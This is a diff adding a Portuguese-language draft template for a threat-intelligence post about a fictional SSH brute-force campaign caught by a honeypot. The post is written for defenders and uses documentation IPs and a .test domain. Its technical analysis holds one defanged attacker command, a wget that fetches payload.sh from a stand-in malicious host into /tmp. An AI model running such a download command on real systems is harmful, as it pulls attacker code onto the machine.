@@ -1,0 +1,61 @@
+---
+title: "Exemplo: campanha de força bruta SSH observada em honeypot"
+description: "Modelo de post de campanha com dados fictícios de faixas de documentação. Copie, troque os dados e remova o draft antes de publicar."
+lang: pt-br
+translationKey: exemplo-honeypot-ssh
+pubDate: 2026-10-04
+type: campaign
+campaign: 2026-10-exemplo-honeypot-ssh
+tlp: CLEAR
+tags: [honeypot, ssh, brute-force]
+attack: [T1110, T1021.004]
+draft: true
+---
+
+> **Apenas exemplo.** Todos os valores abaixo são fictícios (IPs de documentação RFC 5737 e o
+> TLD `.test`). Este post é rascunho e nunca chega à produção; ele mostra a estrutura que todo
+> post de campanha precisa seguir.
+
+## Resumo executivo
+
+Entre 2026-09-01 e 2026-09-28 um honeypot SSH pessoal registrou uma campanha de tentativa de
+senhas a partir de dois endereços, seguida de uma tentativa de baixar um script de
+<Defang value="exemplo-malicioso.test" />. Defensores devem bloquear os indicadores listados e
+alertar sobre falhas repetidas de autenticação SSH seguidas de login bem-sucedido.
+
+## Linha do tempo
+
+| Data (UTC) | Evento |
+| --- | --- |
+| 2026-09-02 | Primeiras tentativas de autenticação de <Defang value="203.0.113.10" /> |
+| 2026-09-05 | Tentativa de download de `payload.sh` |
+| 2026-09-28 | Última atividade observada |
+
+## Análise técnica
+
+Descreva o que foi observado, como e com que nível de confiança. Mantenha os IoCs defanged no
+texto, inclusive em blocos de código:
+
+```bash
+# Defanged de propósito: os valores brutos ficam só nos arquivos CSV/STIX.
+wget hxxp://exemplo-malicioso[.]test/payload.sh -O /tmp/.x
+```
+
+## MITRE ATT&CK
+
+<AttackTable ids={['T1110', 'T1021.004']} />
+
+## Indicadores de comprometimento
+
+<CampaignIocs id="2026-10-exemplo-honeypot-ssh" />
+
+## Detecções
+
+Aponte as regras publicadas no repositório de detecções (Sigma, YARA, Suricata) e explique o
+que cada uma detecta e os falsos positivos esperados.
+
+## Recomendações
+
+- Desabilite autenticação por senha no SSH e exija chaves.
+- Limite ou bloqueie falhas repetidas de autenticação.
+- Procure os indicadores listados nos logs de proxy e DNS.
